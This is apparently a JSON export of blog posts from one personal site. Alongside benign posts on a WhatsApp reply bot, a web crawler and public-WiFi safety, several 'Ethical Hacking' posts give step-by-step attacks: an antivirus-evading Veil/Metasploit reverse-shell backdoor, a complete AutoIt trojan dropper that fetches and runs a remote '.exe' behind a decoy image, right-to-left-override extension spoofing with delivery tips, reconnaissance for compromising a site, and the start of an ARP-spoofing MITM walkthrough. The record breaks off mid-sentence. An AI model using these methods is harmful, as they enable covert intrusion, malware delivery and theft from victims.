[{"categories":["Cool Tech Stuff"],"contents":" Create a program to reply to WhatsApp messages\n Opening a WhatsApp message and replying to \u0026ldquo;Good Morning\u0026rdquo; texts every day or \u0026ldquo;Thank You\u0026rdquo; messages on a special occasion to so many people can be a really monotonous and time taking task. There must have been times when you have wondered if there was a way to automatically reply to messages of certain people. By the end of this blog, your program will be able to reply to Whatsapp messages as and when they are received as shown in the video below:\n  I will be creating a python bot that will go through unread messages in WhatsApp and respond to them as per the response condition set. So no more monotonous texting. You can also have an AI (Artificial Intelligence) bot chatting with your friends you don\u0026rsquo;t want to be bothered by.\n Remember in Silicon Valley, Gilfoyle created an automated reply bot for chatting with Dinesh! 😂\n Creating the WhatsApp response bot I will be using python for this. The steps are as follows :  Read the context of WhatsApp GUI Programatically click on unread messages and extract the message Process the message and programmatically reply to it Programatically opening unread chats  Before starting, we would need to install open-cv, pyautogui, and pyperclip. Open your terminal and type the following commands to install the packages:\n$ pip install opencv-python $ pip install pyautogui $ pip install pyperclip If you are using Ubuntu (Linux), you would have to additionally install the following packages :\n$ sudo apt-get install scrot $ sudo apt install xclip 1. Read the context of WhatsApp GUI Extract Screen Information Create a folder named whatsapp and inside it create a file gui_info.py. This program will collect information about the color and position of certain elements on the screen. Add the following code :\nimport pyautogui as pt from time import sleep while True: posXY = pt.position() print(posXY, pt.pixel(posXY[0], posXY[1])) sleep(1) if posXY[0] == 0: break The above code will print the coordinates of the mouse pointer and the color it is hovering over. The program will terminate when the mouse pointer touches the x-axis. The output should look for this:\nEducate the program about WhatsApp UI Next, we have to take some snapshots to tell the program where it should drag the mouse to and where to click. Take a screenshot of the images marked with a red rectangle.\nTo get the green circle, right-click on a contact and click mark as unread. Now that we have a smilie and unread message screenshot, save it in the project directory.\nCreate a new file main.py in the whatsapp folder and write the following code:\nimport pyautogui as pt from time import sleep import pyperclip import random sleep(3) def move_pointer(): global x, y position = pt.locateOnScreen(\u0026quot;whatsapp/smilie.png\u0026quot;, confidence=.6) x = position[0] y = position[1] pt.moveTo(x, y, duration=0.5) move_pointer() This code will move the mouse pointer to the smilie icon on WhatsApp. Run this python code to verify that the code actually works. The way to do that would be to run the python program and quickly switch to the screen where WhatsApp web is running. (If the program does not move, try playing with the confidence parameter and try it with values between 0.6 to 0.9)\nOnce you verify that the code is working, we will proceed to read the last sent message. Some calibration is required here to move the mouse pointer to the last received message. pt.moveTo(x, y, duration=0.5) will actually move the mouse pointer to the smilie image. The received message is slightly above it, so we will edit it to hover over that message. For me it is pt.moveTo(x+100, y-45, duration=0.5) . You can use trial and error to find out the pixel difference for your screen.\n2. Click on unread messages and extract the message The next step is to programmatically select the last received message, copy it, and read the text from the clipboard. Adding the following lines of code will do it\npt.tripleClick() pt.rightClick() pt.moveRel(12, 15) pt.click() pt.tripleClick() to select the text. pt.rightClick() to right-click pt.moveRel(12, 15) to move the cursor to the copy icon pr.click() to select copy\nThe cursor should copy the text as shown in the above image\nRun it to see everything works as expected.\n3. Process the message and Reply to it Next, I will add a function send_message in main.py . The function definition would look like this.\ndef send_message(message): position = pt.locateOnScreen(\u0026quot;whatsapp/smilie.png\u0026quot;, confidence=.6) x = position[0] y = position[1] pt.move(x+100, y+20, duration=0.5) pt.click() pt.typewrite(message, interval = 0.01) pt.typewrite(\u0026quot;\\n\u0026quot;, interval = 0.01) pt.move(x+200, y+20, duration=0.5) will move the cursor to the reply area\npt.typewrite(message, interval = 0.01) will type the message in the text box.\npt.typewrite(\u0026quot;\\n\u0026quot;, interval = 0.01) is similar to clicking enter on the keyboard, and it will send the message.\nThe above code will return the message back to the person. If we want to process the message and send the response as per a certain condition, we will add the following function process_response :\ndef process_response(message): mes = str(message).lower() if \u0026quot;happy hirthday\u0026quot; in str(mes): return \u0026quot;Thank You!\u0026quot; elif \u0026quot;?\u0026quot; in str(mes): return \u0026quot;Not Interested\u0026quot; elif \u0026quot;good morning\u0026quot; in str(mes): return \u0026quot;Good Morning\u0026quot; elif \u0026quot;Hi\u0026quot; in str(message): return \u0026quot;Hi\u0026quot; else: return \u0026quot;Wassup! How you doin\u0026quot; The above code returns the response as per certain criteria, for eg, if anyone sends a message containing Happy birthday, the program will return \u0026ldquo;Thank You\u0026rdquo; and so on. This is the place where you would be adding an A.I. model (if you have one) to chat with a person.\nOpening unread chats Now we have to write a function that continuously checks for new messages. Basically, search for the green dot I took a screenshot of earlier. I will create a function check_for_unread_messages :\ndef check_for_unread_messages(): while True: try: position = pt.locateOnScreen(\u0026quot;whatsapp/unread.png\u0026quot;, confidence = 0.7) if position is not None: pt.moveTo(position) pt.moveRel(-100,0) sleep(1) except(Exception): print(\u0026quot;No new messages\u0026quot;) The above code will hover over the chat which is unread\nWe will also add a condition to check if there is the last message was sent by the other person. It\u0026rsquo;s more like a fail-safe mechanism in case we run into an infinite loop. The place I select the last chat, I will add a condition to check if the color of the pixel the cursor is hovering is white, then only proceed with the steps.\nThe final code of main.py looks like this:\nimport pyautogui as pt from time import sleep import pyperclip sleep(1) global x, y position = pt.locateOnScreen(\u0026quot;whatsapp/smilie.png\u0026quot;, confidence=.6) x = position[0] y = position[1] def get_received_message(): position = pt.locateOnScreen(\u0026quot;whatsapp/smilie.png\u0026quot;, confidence=.6) x = position[0] y = position[1] pt.moveTo(x+100, y-45, duration=0.5) pt.tripleClick() pt.rightClick() pt.moveRel(100, -170) pt.click() received_message = pyperclip.paste() print(\u0026quot;Received Message: \u0026quot;+received_message) return received_message def send_message(message): position = pt.locateOnScreen(\u0026quot;whatsapp/smilie.png\u0026quot;, confidence=.6) x = position[0] y = position[1] pt.moveTo(x+100, y+50, duration=0.5) pt.click() pt.typewrite(message, interval = 0.01) pt.typewrite(\u0026quot;\\n\u0026quot;, interval = 0.01) def process_response(message): mes = str(message).lower() if \u0026quot;happy hirthday\u0026quot; in str(mes): return \u0026quot;Thank You!\u0026quot; elif \u0026quot;?\u0026quot; in str(mes): return \u0026quot;Not Interested\u0026quot; elif \u0026quot;good morning\u0026quot; in str(mes): return \u0026quot;Good Morning\u0026quot; elif \u0026quot;Hi\u0026quot; in str(message): return \u0026quot;Hi\u0026quot; else: return \u0026quot;Wassup! How you doin\u0026quot; def check_for_unread_messages(): while True: try: position = pt.locateOnScreen(\u0026quot;whatsapp/unread.png\u0026quot;, confidence = 0.7) if position is not None: pt.moveTo(position) pt.moveRel(-100,0) pt.click() sleep(1) except(Exception): print(\u0026quot;No new messages\u0026quot;) if pt.pixelMatchesColor(int(x+100), int (y-35), (255, 255, 255), tolerance = 10): print(\u0026quot;is_white - new message\u0026quot;) received_message = get_received_message() message_to_send = process_response(received_message) send_message(message_to_send) else: print(\u0026quot;no new message\u0026quot;) check_for_unread_messages() Kudos! Your Whatsapp Autoreply bot is ready!\nYou can find the project link here: https://github.com/gouravdhar/automatic-whatsapp-response\n","permalink":"https://gourav-dhar.com/blogs/i-created-an-automated-whatsapp-reply-bot/","tags":["Whatsapp Reply Bot","Cool Tech Stuff","Python"],"title":"I created an automated WhatsApp reply bot! | By Gourav Dhar"},{"categories":["Ethical Hacking"],"contents":"What is a Backdoor ? Backdoor is a method of secretly gaining remote access to a computer by bypassing the normal authentication and firewall of the machine. In this blog, I will be writing on How I created a backdoor for my Windows machine that even the antivirus could not detect. After creating the backdoor, I was able to do a lot of stuff on the Windows machine remotely like controlling the webcam, taking screenshots, using keyloggers etc. Let\u0026rsquo;s get started.\nI created the executable (.exe file) on my Ubuntu machine. This .exe file, when run on a windows machine, created a backdoor to my Ubuntu machine from where I was able to control everything on the windows machine.\nLet\u0026rsquo;s look at the steps that need to be followed.\n1. Installing Veil As a first step, we need to install Veil. To install Veil you can go through this link https://www.javatpoint.com/installing-veil. It will also require installing the metasploitable-framework for ubuntu users (not required for Kali) which can be downloaded from here: https://www.darkoperator.com/installing-metasploit-in-ubunt.\nOnce installed, you can start by just typing veil . (or you can execute it by typing ./Veil.py in the directory veil is installed). The veil shell will open as shown below:\n2. Using Evasion in Veil The veil framework has 2 tools (Evasion and Ordinance) which can be seen by typing list in the veil shell. We are interested in Evasion, so we type\n\u0026gt; use 1 3. Generating the Backdoor executable In backdoors a reverse connection is created, i.e. when the target person double clicks the script, their computer will start the initiation of the backdoor. So it becomes undetectable by many antivirus software because there is no external machine requesting to connect. I also used port 8080 which is a common port used to connect to websites, so nothing would seem suspicious to the antivirus softwares. Type :\n\u0026gt; list I will use the 15th option (it uses go as the programming language for the meterpreter), so I type :\n\u0026gt; use 15 We need to set an IP address to which the backdoor will try to connect. In my case, it is my current computer, so I will set LHOST to the IP of this ubuntu machine (the attacking machine). I will also change the LPORT to 8080. To get my IP I used ifconfig . To set the LHOST and LPORT run :\n\u0026gt; set LHOST \u0026lt;your_IP\u0026gt; \u0026gt; set LPORT 8080 The way anti-virus programs work is that they have a very large database of file signatures that are flagged as suspicious. If your file\u0026rsquo;s signature is present in that database then your file will be flagged as suspicious by the anti-virus softwares. So it is a good practice to use the updated version of veil , since the updated version of veil will generate backdoors to bypass the antivirus softwares.\nWe should try to modify the file and make it more unique so that it bypasses the antivirus. There\u0026rsquo;s no real reason I have written the next 2 lines. It is just to make the signature a little different to bypass the antivirus.\nNext type generate to generate the file. A prompt will appear to name the backdoor. I named it backdoor_8080 but you could name it somewhat different so that it does not cause suspicion.\nA page will appear showing you the location of the saved executable.\nCongrats!!! the backdoor is generated. It is stored at : var/lib/veil/output/compiled/backdoor_8080.exe\n4. Listening for Incoming Connections on the port While creating the port I had used port 8080. So I will open the port on my ubuntu machine so that it is ready to connect when the target computer runs the executable. To do this I use the Metasploit framework. To run Metasploit console, run msfconsole\n$ msfconsole  Note: The Veil-Evasion actually uses the Metasploit to generate the backdoor we created.\n To open the port I used a module provided by Metasploit. It\u0026rsquo;s called multi/handler. So I run,\n\u0026gt;use exploit/multi/handler Type show options to see the options which are set\nWe will change these settings to suit our requirements. Run the following commands:\n\u0026gt; set PAYLAOD windows/meterpreter/reverse_https \u0026gt; set LHOST \u0026lt;IP\u0026gt; \u0026gt; set LPORT 8080 \u0026gt; show options Here is the IP used at the time of creating the backdoor\nType exploit to start listening on the port\n\u0026gt; exploit 5. Delivering the backdoor to a target computer There are various social engineering ways to deliver the backdoor to a target computer. One such way is described in the blog below, where I have written how to create a trojan. Basically, it disguised the .exe file in an image in a .jpg file.\n\u0026gt; use 1 \n6. Testing the backdoor on the Windows Double-clicking on the backdoor_8080.exe file in the Windows machine executed my executable. In the Metasploit where we were listening for connections in the ubuntu machine, we can see the metepreter shell has been opened.\nThe meterpreter shell will look like the one shown above. You can type help to get a long list of commands and their description as to what you can do. A list of basic commands which you can run is\n\u0026gt; sysinfo \u0026gt; ipconfig \u0026gt; pwd \u0026gt; shell Apart from these, you can also change user privileges, upload/download files, run this executable as a service, take screenshots, store keystrokes, and lots of other stuff.\nSummarising Backdoors While it seems that creating backdoors is something that is wrong and is done only by blackhat hackers, it is not entirely true. Some of the product-based companies also create backdoors into their products so that if their users lose access to their accounts or products the companies can help them gain access. While the above method is a good way to create backdoors, if you want to be on the ethical side of the line, do not use it to gain access to computers you don\u0026rsquo;t have permission to.\n","permalink":"https://gourav-dhar.com/blogs/how-i-created-an-undetectable-backdoor-for-windows-ethical-hacking/","tags":["Hacking","Programming","Spoofing"],"title":"How I created an undetectable Backdoor for Windows - Ethical Hacking | By Gourav Dhar"},{"categories":["Cool Tech Stuff"],"contents":"What is a web crawler? A web crawler is a bot that crawls the internet to index and downloads the contents of websites for scraping. Web crawlers are also called web spiders or crawling bots. A web crawler needs to be provided with a list of initial websites to start from which it will index and crawl the links present in the indexed websites to discover new pages.\nThe Library Analogy To give an analogy, let\u0026rsquo;s consider all the websites on the internet as books present in a library. A web crawler is a librarian whose job is to enter the book\u0026rsquo;s information in a catalog so that it is easy to find the books when required. To organize the books, the librarian will store the title, description, and category of the books in a catalog. A web crawler will also do the same thing. The goal of a web crawler is accomplished when it indexes all the pages on the internet. Something which is impossible to achieve!\nCreating a Web Crawler In this blog, I will be coding in python. There are a couple of web crawling and web scraping frameworks present in python. I will be using scrapy.\nInstalling scrapy:\n$ pip install scrapy 1. Create a python application using scrapy To create a scrapy project run the following command. Here the name of my application is my_first_web_crawler\n$ scrapy startproject my_first_web_crawler This will generate a scrapy boilerplate code and folder structure that should look like this: 2. Creating a Web Crawler The folder named spiders contains the files which scrapy uses to crawl the websites. I will create a file named spider1.py in this directory and write the following lines of code:\n You can find the above code here: Link to the above code\n I have provided the URLs of my web pages which I will be crawling. These pages contain links to my blogs. You can provide any number of URLs since this is a list. My URLs which I will be crawling :\nhttps://gourav-dhar.com https://gourav-dhar.com/profile The above code crawls through the web pages provided in the links and downloads the pages. To execute the code, run the following command :\nscrapy crawl \u0026lt;your-spider-name\u0026gt; My spider name is blogs (Defined in line 7 of the above code)\nAnd tada!!! The data of the links have been downloaded in the project folder.\nBut that\u0026rsquo;s not enough, I want to actually download the data of the links this page points to. For this, I have to scrape all the links present on the main page and crawl through it. I will be using scrapy shell to write code to scrape the website information.  Note: Scrapy Shell is an interactive shell where you can try and debug scraping code very quickly\n To start scrapy shell, just write :\n$ scrapy shell \u0026#39;https://gourav-dhar.com\u0026#39; i.e. scrapy shell followed by the url\nOnce the shell is opened, type response to confirm that you get a 200 response.\nThe referring links are generally located in the a href class in the html. I need to scrape all the values present in this link, so I will write this to see the output\n\u0026gt;\u0026gt;\u0026gt; response.css(\u0026#39;a::attr(href)\u0026#39;) This is a list of a href classes on the page. To get a cleaned out result of only the links, we have to use the getall() function\n\u0026gt;\u0026gt;\u0026gt; response.css(\u0026#39;a::attr(href)\u0026#39;).getall() The result should look like this : This will return me a list of all the values of href. To download all the files in this list, I will modify my parse function in the spider code to get all the links using the above command. The modified parse function looks something like this:\n The Github Link for the project can be found here : GitHub Link\n Now again run the following command in the terminal: $ scrapy crawl blogs And I was able to download the content of all the links my homepage points to. This function can be extended to an infinite loop where you can crawl through all the websites on the internet. Summarising Web Crawler The web crawler is a powerful tool to store and index the contents of a web page. Its applications are enormous.  Note : You can also add filters as to who can crawl your site by mentioning the blacklisted/whitelisted domains in the robots.txt file of your site.  The search engines use web crawling to index and store the meta titles and descriptions in their database to quickly show the results of the queries the user enters. Examples of major search engines are Google, Bing, Yahoo, Duck Duck Go. The search engines also add their own recommendation system on top of these results which makes each search engine\u0026rsquo;s algorithms different.\nWeb crawling is also used for copyright/plagiarism violation detection. Web Analytics and Data Mining are also the major applications. It can also be used to detect web malware detection like phishing attacks. Suppose you own facebook.com, you can crawl the internet to check if anyone else is using a website that looks similar to facebook.com which can be used for phishing attacks.\n The Github Link for the project can be found here : GitHub Link\n ","permalink":"https://gourav-dhar.com/blogs/how-i-created-my-first-web-crawler-cool-tech-stuff/","tags":["Web Scraping","Cool Tech Stuff","Web Crawling","Python"],"title":"How I created my first Web Crawler! | By Gourav Dhar"},{"categories":["Ethical Hacking"],"contents":" A Trojan horse (or Trojan) is one of the most common and dangerous types of threats that can infect your computer or mobile device.\n What is trojan malware? Trojan malware, when opened appears to be a legitimate file opened by the user like opening an image or a document or playing a media file, but in the background, it will run some evil process like someone may be gaining access to your computer through a backdoor or injecting some other harmful code.\nCreating my trojan malware In this blog, I will show you how I combined my executable file with an image file, and when opened, it was able to display the image when a target person opened it, but at the same time, the executable ran in the background. In simple words, I hid my .exe file in a .jpg image file.\nThis method can be extended to any file type like image, pdf, music, and so on. The executable in most cases is a virus or a backdoor used to gain access to the target computer. Let\u0026rsquo;s look at the steps: 1. Get a direct URL for the image and the .exe file The .exe the executable file needs to be present on a publicly available URL from where it is directly downloaded by the browser. I have uploaded the executable on dropbox for this purpose. In the case of dropbox, modifying the end part of the sharable link to dl=1 will allow the browser to directly download the file. The link I have shared below does not contain any code and is actually an empty file, so it is safe for you to test the behavior of this link.\nURL for the .exe executable:\nhttps://www.dropbox.com/s/hsnvw0ik1em0637/some_evil_file.exe?dl=1 URL for my image:\nhttps://images.adsttc.com/media/images/5b04/5e3a/f197/cc1f/9600/00aa/newsletter/park_garden_concourse.jpg I have used the image of the sports complex as a cover.\n2. Using the URLs in a script #include \u0026lt;StaticConstants.au3\u0026gt; #include \u0026lt;WindowsConstants.au3\u0026gt; Local $urls = \u0026quot;url1,url2\u0026quot; Local $urlsArray = StringSplit($urls, \u0026quot;,\u0026quot;, 2 ) For $url In $urlsArray $sFile = _DownloadFile($url) shellExecute($sFile) Next Func _DownloadFile($sURL) Local $hDownload, $sFile $sFile = StringRegExpReplace($sURL, \u0026quot;^.*/\u0026quot;, \u0026quot;\u0026quot;) $sDirectory = @TempDir \u0026amp; $sFile $hDownload = InetGet($sURL, $sDirectory, 17, 1) InetClose($hDownload) Return $sDirectory EndFunc ;==\u0026gt;_GetURLImage In the above code, in line number 3, replace url1 with the URL of the image and url2 with the URL of the executable file. My final code looks like this\n#include \u0026lt;StaticConstants.au3\u0026gt; #include \u0026lt;WindowsConstants.au3\u0026gt; Local $urls = \u0026quot;https://images.adsttc.com/media/images/5b04/5e3a/f197/cc1f/9600/00aa/newsletter/park_garden_concourse.jpg,https://www.dropbox.com/s/hsnvw0ik1em0637/some_evil_file.exe?dl=1\u0026quot; Local $urlsArray = StringSplit($urls, \u0026quot;,\u0026quot;, 2 ) For $url In $urlsArray $sFile = _DownloadFile($url) shellExecute($sFile) Next Func _DownloadFile($sURL) Local $hDownload, $sFile $sFile = StringRegExpReplace($sURL, \u0026quot;^.*/\u0026quot;, \u0026quot;\u0026quot;) $sDirectory = @TempDir \u0026amp; $sFile $hDownload = InetGet($sURL, $sDirectory, 17, 1) InetClose($hDownload) Return $sDirectory EndFunc ;==\u0026gt;_GetURLImage Save the file with an extension .au3 . I have named the file trojan .au3 .\n3. Creating an icon for the file Since I am using an image as a cover file, Windows usually shows the thumbnail of the image as a file icon, so I will use the sports complex image as an icon and convert it to .ico format. You can google for it and you will find a number of tools to do it. I used this website for it - https://cloudconvert.com/jpg-to-ico\n4. Compiling the script The script is written in a scripting language called AutoIt. To install AutoIt in Ubuntu, you can install wine and install AutoIt , or if you want a straightforward way, install Veil from the steps mentioned here https://www.javatpoint.com/installing-veil. AutoIt will be installed in one of the steps after which you can exit the installation. Open the Compile AutoIt app. The window should look something like the box shown below. Enter the location of the trojan.au3 file and the path of the .ico file.\nThe converted file looks like this on a windows machine.\nWell, something\u0026rsquo;s not right. The problem with this file is its extension. It is obvious that is an executable since its extension is .exe . We need to spoof this extension.\n5. Spoofing \u0026lsquo;.exe\u0026rsquo; extension to any extension To spoof the obvious extension .exe and replace it with .jpeg , we will use a right-to-left-override character.\nTo know about the detail of how spoofing actually works and where to place the right-to-left-override character, read the blog. Spoofing File Extensions\nTo summarise the steps mentioned in the above blog:\n Rename trojan.exe to trojangpj.exe .  Paste the right-to-left-override character at the 7th position after trojan. All the characters after the right-to-left-override the character will be flipped i.e read right to left.   The filename now looks like trojanexe.jpg\nSince the image contained in the file is of a sports complex I will replace trojan in the name with sportscompl_ so that the file name reads sports_complexe.jpg .\nCongrats!!! Your trojan is ready. Now the filename matches with the image contained. Some recent browsers remove the right-to-left-override before downloading. So it is a good idea to zip the file and send it over.\n","permalink":"https://gourav-dhar.com/blogs/how-i-created-my-trojan-malware-ethical-hacking/","tags":["Hacking","Programming","Spoofing"],"title":"How I created a Trojan Malware - Ethical Hacking | By Gourav Dhar"},{"categories":["Ethical Hacking"],"contents":"File extension spoofing is a handy trick when creating trojans. In this blog, I will be spoofing the \u0026lsquo;.exe\u0026rsquo; extension to the \u0026lsquo;.jpg\u0026rsquo; extension. But this method can be extended to spoof any extension type.\nI have a file named trojan.exe whose name I will change to sports_complexe.jpg by the end of this blog.\nI will use a right-to-left-override character to spoof the extension .exe and replace it with .jpg . Let me tell you how.\nCurrent file name -\u0026gt; trojan.exe\nDesired extension -\u0026gt; .jpg\nTo remove the .exe from extension, I will use a right-to-left-override character to make the file name read from right to left after the right-to-left-override  is placed. Right-to-left of .jpg would be gpj.\nTo get the right-to-left-override character open the characters application in Ubuntu and search for the right-to-left-override character. You can follow the steps shown in the pictures below.\nRename trojan.exe to trojangpj.exe . Paste the right-to-left-override character at the 7th position after trojan. All the characters after the right-to-left-override character will be flipped i.e. read right to left. The filename now looks like trojanexe.jpg\nTo make the executable look more realistic, since the image icon contained in the file is of a sports complex I will replace trojan in the name with sports_compl so that the file name reads sports_complexe.jpg\nAnd tada! , the file extension spoofing was successful. Some recent browsers remove the right-to-left-override before downloading. So it is a good idea to zip the file and send it over.\n","permalink":"https://gourav-dhar.com/blogs/spoofing-file-extensions-ethical-hacking/","tags":["Hacking","Programming","Spoofing"],"title":"Spoofing file extensions - Ethical Hacking | By Gourav Dhar"},{"categories":["Ethical Hacking"],"contents":" Hacking a website? Don’t miss out on this important step!\n Before hacking a website or a resource, it is a good practice to first accumulate all the information which can be gathered related to the target resource. Hackers/penetration testers gather all possible information related to the website they want to hack. Then they come up with a strategy to attack the resource with this information. A lot of this information is publicly available on the internet.\nIn this blog, I will go through the main tools which can be used to get all this information. Main steps are\n Whois Lookup — Domain Name Info Finding out the technologies Used Discovering open ports on the server Websites on the same server Discovering subdomains of the website Discovering files on the website  Let’s look at how to perform these steps:\nWhoIs lookup — Domain Name Info WhoIS lookup is a protocol used to find out the owner of any resource on the internet. It can be the owner of a domain name or IP address. This information is easy to fetch, you can google whois lookup to find a list of websites providing this service. I have used https://whois.domaintools.com to fetch WhoIs details in the screenshots below. Anyone can get information related to the website owner’s country, the date since the website was active, the IP address of the website, the company that registered the domain, and a lot more things.\nTechnologies used by the Target Website For this, there’s a tool available at https://sitereport.netcraft.com/. This site will give information related to a lot of things, most importantly the technologies used to host that website. If the website uses javascript , the hacker can run a javascript code that will affect the client\u0026rsquo;s computer. If the website uses PHP , the hacker can write a PHP code for server-side attacks. We also get the information on web trackers used by the website. The result for my website — https://gourav-dhar.com looks like this.\nWebsites on the same server If you are trying to hack a website and you are not able to find any vulnerabilities, the next step is to find any other website that exists on the same server. If two websites exist on the same server, then they will have the same IP address. If you are able to hack any other website, you can navigate through the file system to the target website. To do this you would need to do a reverse DNS lookup.\nThe role of a DNS server is to convert a URL to IP address. Whenever you browse a URL, the internet service provider (ISP) will query the DNS server for an IP address where the requests need to be sent, and return the IP address.\nWith reverse DNS lookup, we can get the website information hosted on the IP address/computer. To do this navigate to https://viewdns.info/. Under the heading Reverse IP Lookup , enter the IP of the target website and click on Go to get the list of websites hosted on the same computer.\nYou will get a list of all websites hosted on the same IP in which the target website is present. Now you can try to find the least secure website among these and navigate your way to the target website.\nDiscovering open ports on the IP There’s a tool Zenmap which helps us to do it. It can be installed with the following command:\n$ sudo apt install zenmap Put the target IP and select intense scan to look for open ports and the service version details which can be exploited.\nDiscovering sub-domains of a website A lot of websites have subdomains. It is useful to discover the information related to the subdomains of the website. You can get information of the web pages that the admin or management of the website use. You can also access the beta version of the web application or the parts of the web application still under development. There are high chances of finding bugs in the applications under development, hence higher chances of finding weaknesses that can be exploited to gain access to systems.\nThere are a lot of tools that can be used to discover subdomains. One such tool is knockpy . Installing it is very simple. Run :\n$ sudo apt install knockpy To use this tool, run knockpy followed by the domain name. I will run it for google.com.\n$ knockpy google.com Discovering files on the website Sometimes there is a chance of finding config files on the server location. These config files can give us a lot of information that can be used to hack into a website. To discover such files, there’s a tool named dirb. To install it run the following command\n$ sudo apt install dirb This tool will send requests to the target website with a word picked up from a wordlist. It will only be able to search for files and directories based on the wordlist that the user provides or the default wordlist present in dirb.\nFinally, run man dirb to explore all the options this command provides.\n  While the above is a list of the main approaches related to information gathering, there are a lot of open-source tools that speed up this process. Remember google is your friend!\n ","permalink":"https://gourav-dhar.com/blogs/information-gathering-first-step-towards-website-hacking/","tags":["Hacking","Programming","Spoofing"],"title":"Information Gathering - Hacking | Gourav Dhar"},{"categories":["Ethical Hacking"],"contents":" Feeling insecure while browsing on public WiFi? This blog is for you.\n Risk related to Public wifi networks Whenever someone connects to public wifi networks, i.e. the WiFi Access points provided by hotels, libraries, colleges, restaurants, cafes, airports, or any other open wifi networks, there is a risk that the admin of these networks can secretly intercept their data (like browsing history, URLs visited), or a hacker can gain access to the admin’s computer and analyze the data or perform Man-in-the-Middle attacks (javascript injection, read personal data like usernames, passwords, websites visited, etc.). By default all the data will flow through the admin’s computer, so he will be able to see this data.\nTo know more about Man-in-the-Middle Attacks, refer to the blog below :\n\nHow to mitigate this risk The solution is simple — Encrypt your traffic. Once the traffic is encrypted, we don’t really care if anyone intercepts it because the traffic will be jibberish and of no use to the person intercepting it. There are a number of ways to encrypt data. The simplest and most efficient way is the combination of :\n HTTPS everywhere plugin Use VPN  HTTPS Everywhere plugin HTTPS Everywhere plugin developed by EFF(Electronic Frontier Foundation), will prevent the attacker/man-in-the-middle to downgrade your HTTPS connection to the un-secure HTTP connection, thereby preventing data interception and man in the middle attacks. You can google search for it or download it from the link below :\n For Google Chrome: https://chrome.google.com/webstore/detail/https-everywhere/gcbommkclmclpchllfjekcdonpmejbdp?hl=en For Mozilla Firefox: https://addons.mozilla.org/en-US/firefox/addon/https-everywhere/  Browsers like Edge, Brave, Opera, Tor are also supported. You can download the extension for these browsers from here https://www.eff.org/https-everywhere.\n Note: This plugin is really good for websites that support HTTPS but data of websites using HTTP can still be intercepted.\n HTTPS everywhere plugin is also not 100 percent secure because it still can’t prevent attacks like DNS spoofing, where the attacker can see which URLs(not the data since it is encrypted) the connected computer is visiting.\nUse VPN (Virtual Private Network) If you want to take your security to the next level and completely encrypt everything you browse on the network, then you should consider using a private VPN.\nEnabling VPN will create an encrypted tunnel between your computer and the VPN server you are connecting to, and all the data will flow through this encrypted tunnel. VPN is useful for a lot of reasons, some of them are:\n Adds an extra layer of encryption Bypass censorship and filters sanctioned by your network/internet service provider Privacy and protection from man-in-the-middle attacks  One needs to be careful while selecting a VPN server because the admin of the VPN server can intercept the data if he wants. Things to look out for while selecting a VPN:\n Use a trustable and reputed VPN service provider Don’t use free VPN, (providing VPN is very expensive, therefore there must be another reason as to why the VPN is free) Make sure the VPN provider does not keep logs   Note: Using Https Everywhere plugin removes the possibility of the VPN server provider of intercepting your data\n  Summarising all of the above in a table :    Method Pros Cons     Https Everywhere Plugin Free -Visited websites are still visible, Covers only HTTPS websites   VPN Sends data through an encrypted channel Not free , VPN provider can intercept data   Https Everywhere Plugin + VPN Double Layer of Encryption , Protects against VPN Provider intercepting data Not Free    Hence we can conclude that HTTPS Everywhere Plugin and a private VPN is very good combination if we want to securely browse any public WiFI.\nSafe Browsing everyone!\n","permalink":"https://gourav-dhar.com/blogs/how-to-securely-browse-the-internet-prevent-data-leaks-while-connecting-to-public-wifi-networks/","tags":["Network Security","Hacking","Programming","Spoofing"],"title":"How to securely browse the Internet | Prevent data leaks while connecting to public WiFi networks | Gourav Dhar"},{"categories":["Ethical Hacking"],"contents":"What is Man in The Middle (MITM) Attack? A man in the middle (MITM) attack is a general term for when a machine positions itself in between a connection between a client/user and the server/internet — either to eavesdrop or to impersonate one of the parties, making it appear as if a normal exchange of information is underway. This is nicely depicted in the diagram below.\nThe MiTM attacker will be able to place himself/herself between the user and the internet server to see what is happening. We will be using an ARP spoofing attack to achieve this. Before starting let’s know what is ARP protocol and how we are going to exploit it to become the man-in-the-middle.\nWhat is ARP? ARP stands for Address Resolution Protocol. It links the IP addresses to the device MAC addresses. Each computer in a network will have a table storing IP addresses of the device in a network with their MAC addresses. So whenever data is sent in a network, it will be sent to the device having the MAC address associated with the destination IP of the packet. We can see this ARP table by running the following command.\n$ arp -a For me, this is the output:\nARP Spoofing ARP Spoofing can be achieved by telling the router that the user’s IP corresponds to our MAC address. We will also tell the user that the router’s IP address corresponds to my MAC address. And guess what !!! all the traffic between the user and router will now flow through our machine.\nThe reason that this exploit is possible is because the ARP protocol is not secure, the client machines will accept responses even if they didn’t send requests and the client machines won’t even verify before updating their ARP table. You can look at the image below for a graphical representation of what we will be achieving.\nwebp\nAs mentioned, we will be using an ARP spoofing attack to be the Man-In-The-Middle. ARP Spoofing will redirect the flow of packets. So instead of packets flowing directly between the client and access point, it would redirect through our system. This means that we will be able to see all the websites, usernames, passwords, images that the user is browsing.\nLet’s practically see how this would work. I am using Ubuntu 20.04 for executing all the below commands. The commands will remain the same for any Debian-based Linux Machine. Kali Linux is preferred since it will have most of the tools pre-installed. The tool I will be using is bettercap . It’s an open-source tool. Let’s download it and install it by running the following commands in your terminal :\n$ wget \u0026quot;https://github.com`curl -s https://github.com/bettercap/bettercap/releases | grep -E -o '/bettercap/bettercap/releases/download/v[0-9.]+/bettercap_linux_amd64_(|v)[0-9.]+zip' | head -n 1`\u0026quot; $ unzip bettercap_linux_amd64_*zip $ sudo mv bettercap /usr/local/bin/ $ rm bettercap_linux_amd64_* Run bettercap -h to see that the installation is proper\n$ bettercap -h  Note : There’s an optional step. If you want you can change your MAC address. This is a way to hide your identity on the network. To do this, you can follow the steps here: How to change MAC Address?\n Being the Man In The Middle 1. Get the interface name by running \u0026lsquo;ifconfig\u0026rsquo; in the terminal As you can see I have 2 interfaces, wlan0 and wlxb0a7b9b32df2 . I will choose wlxb0a7b9b32df2 interface and use it in further commands. You can choose any of them.\n2. Get inside the bettercap tool by running the following command. interface-name is the name we fetched in the above step.\n$ bettercap -iface \u0026lt;interface-name\u0026gt; Hereafter we will write all the commands inside this shell.\n ProTip : You can type help inside this shell to get a list of all the cool stuff you can do using bettercap\n 3. Getting the list of device IPs connected with the router We require a list of devices connected to the router so that we can select a target device on which we will perform the attack.\nTo do this we will start the net.probe module. This module will keep probing for new hosts on the network by sending dummy UDP packets to every possible IP on the subnet. To turn net.probe on, execute the below command\nbettercap-shell\u0026gt; net.probe on Turning it on will also trigger the net.recon module on which will read the ARP cache in order to monitor for new hosts on the network and create a nice list out of it.\nTo view this list run the following 